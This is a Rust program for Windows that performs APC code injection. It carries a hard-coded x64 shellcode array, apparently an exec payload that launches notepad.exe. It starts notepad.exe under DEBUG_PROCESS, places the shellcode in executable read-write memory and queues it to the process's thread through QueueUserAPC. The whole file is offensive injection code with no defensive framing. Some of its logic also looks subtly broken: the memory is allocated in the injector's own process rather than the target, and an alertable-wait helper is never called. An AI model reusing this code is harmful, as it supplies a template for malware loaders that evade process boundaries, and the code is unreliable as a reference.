use std::ffi::CString;
use std::ptr::null_mut;
use std::sync::Arc;
use std::u32;
use windows::core::HRESULT;
use windows::Win32::Foundation::{HANDLE, GetLastError};
use windows::Win32::System::Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use windows::Win32::System::Threading::{CreateProcessA, QueueUserAPC, Sleep, DEBUG_PROCESS, PROCESS_INFORMATION, STARTUPINFOA};
use windows::Win32::System::Environment::GetEnvironmentVariableA;
use windows_strings::{self, PCSTR, PSTR};

const MAX_PATH: u32 = 260;

fn main() {
    let shellcode : [u8; 279] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
        0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
        0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
        0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
        0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
        0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
        0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
        0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
        0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
        0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
        0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
        0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
        0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
        0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
        0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
        0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
        0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
        0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
        0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,
        0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
        0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
        0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,0x65,
        0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00];
    let mut pid: u32 = 0;
    let mut h_process: HANDLE = unsafe{ std::mem::zeroed() };
    let mut h_thread: HANDLE = unsafe{ std::mem::zeroed() };
    println!("{:?}",CreateSuspendedProcess("notepad.exe", &mut pid, &mut h_process, &mut h_thread));

    RunViaApcInjection(h_thread, &shellcode);
}

fn CreateSuspendedProcess(
    lp_app_name: &str,
    dw_process_id: &mut u32,
    h_process: &mut HANDLE,
    h_thread: &mut HANDLE,
) -> bool {
    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed::<STARTUPINFOA>();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed::<PROCESS_INFORMATION>();

        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let windir = PCSTR::from_raw(b"WINDIR\0".as_ptr());
        let mut buffer = [0u8; 260];

        if GetEnvironmentVariableA(windir, Some(&mut buffer)) == 0 {
            return false;
        }

        let mut l_path = [0u8; 260];

        let path_str = format!(
            "{}\\System32\\{lp_app_name}\0",
            std::str::from_utf8(&buffer[..buffer.iter().position(|&x| x == 0).unwrap_or(0)])
                .unwrap()
        );
        l_path[..path_str.len()].copy_from_slice(path_str.as_bytes());


        // Create the process
        match CreateProcessA(
            None,
            Some(PSTR::from_raw(l_path.as_mut_ptr())),
            None,
            None,
            false,
            DEBUG_PROCESS,
            None,
            None,
            &si,
            &mut pi,
        ) {
            Err(err) => {
                eprintln!("{err}");
                return false;
            }
            Ok(_) => {}
        }

        *dw_process_id = pi.dwProcessId;
        *h_process = pi.hProcess;
        *h_thread = pi.hThread;

        true
    }
}


fn RunViaApcInjection(h_thread: HANDLE, payload: &[u8]) -> bool {
    unsafe {
        let p_address = VirtualAlloc(
            None,
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if p_address.is_null() {
            eprintln!("{:?}", std::io::Error::last_os_error());
            return false;
        }

        std::ptr::copy_nonoverlapping(payload.as_ptr(), p_address as *mut u8, payload.len());

        if VirtualProtect(
            p_address,
            payload.len(),
            PAGE_EXECUTE_READWRITE,
            null_mut(),
        ).is_err() {
            eprintln!("{:?}", std::io::Error::last_os_error());
            return false;
        }

        if QueueUserAPC(std::mem::transmute(p_address), h_thread, 0) == 0 {
            eprintln!("{:?}", std::io::Error::last_os_error());
            return false;
        }
        true
    }
}

fn AlertableFunction() {
    unsafe {
        Sleep(u32::MAX);
    }
}
